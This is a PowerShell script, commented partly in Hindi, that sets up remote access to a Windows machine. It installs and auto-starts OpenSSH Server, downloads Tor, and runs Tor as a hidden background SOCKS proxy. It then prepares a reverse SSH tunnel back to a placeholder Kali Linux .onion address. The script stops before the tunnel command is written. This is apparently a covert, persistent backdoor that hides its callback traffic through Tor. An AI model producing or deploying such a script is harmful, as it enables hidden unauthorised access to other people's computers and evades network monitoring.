# 1. Check for Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] Please run this script as Administrator!" -ForegroundColor Red
    Pause
    Exit
}

Write-Host "[+] Admin privileges confirmed." -ForegroundColor Green

# 2. Install OpenSSH Server if not installed
$sshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'
if ($sshServer.State -ne 'Installed') {
    Write-Host "[*] Installing OpenSSH Server..." -ForegroundColor Yellow
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
} else {
    Write-Host "[+] OpenSSH Server is already installed." -ForegroundColor Green
}

# 3. Start SSH Service
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# 4. Download Tor for Windows (Standalone Portable) agar nahi hai toh
$torDir = "$PSScriptRoot\Tor"
$torExe = "$torDir\tor.exe"
if (-not (Test-Path $torExe)) {
    Write-Host "[*] Downloading Tor binaries for Windows..." -ForegroundColor Yellow
    $torZip = "$PSScriptRoot\tor.zip"
    # Official Tor Expert Bundle URL for Windows
    Invoke-WebRequest -Uri "https://archive.torproject.org/torproject-package-archive/torbrowser/13.0.1/tor-win32-0.4.8.9.zip" -OutFile $torZip
    Write-Host "[*] Extracting Tor..." -ForegroundColor Yellow
    Expand-Archive -Path $torZip -DestinationPath$PSScriptRoot -Force
    Remove-Item $torZip
} else {
    Write-Host "[+] Tor binary found locally." -ForegroundColor Green
}

# 5. Create a temporary Tor configuration file for SOCKS proxy
$torrcPath = "$torDir\torrc"
"SocksPort 9050" | Out-File -FilePath $torrcPath -Encoding ascii

# 6. Start Tor Background Process
Write-Host "[*] Starting local Tor background proxy..." -ForegroundColor Yellow
Start-Process -FilePath "$torExe" -ArgumentList "-f `"$torrcPath`"" -WindowStyle Hidden

# Wait a few seconds for Tor to establish connection
Start-Sleep -Seconds 10

# 7. Setup Reverse SSH Tunnel to Kali .onion address
# Yahan apna Kali ka user aur .onion address dalein
$KaliUser = "kali"
$KaliOnion = "YOUR_KALI_ONION_ADDRESS.onion"

Write-Host "[+] Connecting back to Kali Linux via Tor..." -ForegroundColor Green
# Plink ya native ssh command ka use karke reverse tunnel establish karein
# Yeh Windows ko Kali ke sath securely jod dega
